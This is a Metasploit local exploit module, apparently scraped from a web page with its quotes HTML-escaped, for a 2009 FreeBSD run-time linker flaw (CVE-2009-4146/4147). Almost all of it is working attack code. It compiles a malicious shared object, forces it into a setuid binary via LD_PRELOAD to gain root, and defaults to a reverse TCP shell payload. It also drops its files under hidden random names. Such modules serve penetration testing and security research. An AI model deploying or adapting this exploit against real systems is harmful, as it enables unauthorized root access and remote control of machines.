# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;FreeBSD rtld execl() Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in the FreeBSD
        run-time link-editor (rtld).

        The rtld `unsetenv()` function fails to remove `LD_*`
        environment variables if `__findenv()` fails.

        This can be abused to load arbitrary shared objects using
        `LD_PRELOAD`, resulting in privileged code execution.

        This module has been tested successfully on:

        FreeBSD 7.2-RELEASE (amd64); and
        FreeBSD 8.0-RELEASE (amd64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Kingcope&#039;, # Independent discovery, public disclosure, and exploit
          &#039;stealth&#039;,  # Discovery and exploit (4b1717926ed0d4823622011625fb1824)
          &#039;bcoles&#039;    # Metasploit (using Kingcope&#039;s exploit code [modified])
        ],
      &#039;DisclosureDate&#039; => &#039;2009-11-30&#039;,
      &#039;Platform&#039;       => [&#039;bsd&#039;], # FreeBSD
      &#039;Arch&#039;           =>
        [
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
      &#039;SessionTypes&#039;   => [&#039;shell&#039;],
      &#039;References&#039;     =>
        [
          [&#039;BID&#039;, &#039;37154&#039;],
          [&#039;CVE&#039;, &#039;2009-4146&#039;],
          [&#039;CVE&#039;, &#039;2009-4147&#039;],
          [&#039;SOUNDTRACK&#039;, &#039;https://www.youtube.com/watch?v=dDnhthI27Fg&#039;],
          [&#039;URL&#039;, &#039;https://seclists.org/fulldisclosure/2009/Nov/371&#039;],
          [&#039;URL&#039;, &#039;https://c-skills.blogspot.com/2009/11/always-check-return-value.html&#039;],
          [&#039;URL&#039;, &#039;https://lists.freebsd.org/pipermail/freebsd-announce/2009-December/001286.html&#039;],
          [&#039;URL&#039;, &#039;https://securitytracker.com/id/1023250&#039;]
        ],
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;DefaultOptions&#039; =>
        {
          &#039;PAYLOAD&#039;          => &#039;bsd/x86/shell_reverse_tcp&#039;,
          &#039;PrependSetresuid&#039; => true,
          &#039;PrependSetresgid&#039; => true,
          &#039;PrependFork&#039;      => true,
          &#039;WfsDelay&#039;         => 10
        },
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptString.new(&#039;SUID_EXECUTABLE&#039;, [ true, &#039;Path to a SUID executable&#039;, &#039;/sbin/ping&#039; ])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def suid_exe_path
    datastore[&#039;SUID_EXECUTABLE&#039;]
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def is_root?
    (cmd_exec(&#039;id -u&#039;).to_s.gsub(/[^\d]/, &#039;&#039;) == &#039;0&#039;)
  end

  def check
    kernel_release = cmd_exec(&#039;uname -r&#039;).to_s
    unless kernel_release =~ /^(7\.[012]|8\.0)/
      vprint_error "FreeBSD version #{kernel_release} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "FreeBSD version #{kernel_release} appears vulnerable"

    unless command_exists? &#039;gcc&#039;
      vprint_error &#039;gcc is not installed&#039;
      return CheckCode::Safe
    end
    print_good &#039;gcc is installed&#039;

    unless setuid? suid_exe_path
      vprint_error "#{suid_exe_path} is not setuid"
      return CheckCode::Detected
    end
    vprint_good "#{suid_exe_path} is setuid"

    CheckCode::Appears
  end

  def exploit
    unless check == CheckCode::Appears
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    if base_dir.length > 1_000
      fail_with Failure::BadConfig, "#{base_dir} path length #{base_dir.length} is larger than 1,000"
    end

    payload_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"

    executable_data = <<-EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
  extern char **environ;
  environ=NULL;
  system("#{payload_path} &");
}
EOF

    executable_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
    upload "#{executable_path}.c", executable_data
    output = cmd_exec "gcc -o #{executable_path}.o -c #{executable_path}.c -fPIC -Wall"
    register_file_for_cleanup "#{executable_path}.o"

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{executable_path}.c failed to compile"
    end

    lib_name = ".#{rand_text_alphanumeric 5..10}"
    lib_path = "#{base_dir}/#{lib_name}"
    output = cmd_exec "gcc -shared -Wall,-soname,#{lib_name}.0 #{executable_path}.o -o #{lib_path}.0 -nostartfiles"
    register_file_for_cleanup "#{lib_path}.0"

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{executable_path}.o failed to compile"
    end

    exploit_data = <<-EOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
  extern char **environ;
  environ = (char**)calloc(8096, sizeof(char));

  environ[0] = (char*)calloc(1024, sizeof(char));
  environ[1] = (char*)calloc(1024, sizeof(char));
  strcpy(environ[1], "LD_PRELOAD=#{lib_path}.0");

  return execl("#{suid_exe_path}", "", (char *)0);
}
EOF

    exploit_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
    upload "#{exploit_path}.c", exploit_data
    output = cmd_exec "gcc #{exploit_path}.c -o #{exploit_path} -Wall"
    register_file_for_cleanup exploit_path

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{exploit_path}.c failed to compile"
    end

    upload payload_path, generate_payload_exe
    chmod payload_path

    print_status &#039;Launching exploit...&#039;
    output = cmd_exec exploit_path
    output.each_line { |line| vprint_status line.chomp }
  end
end

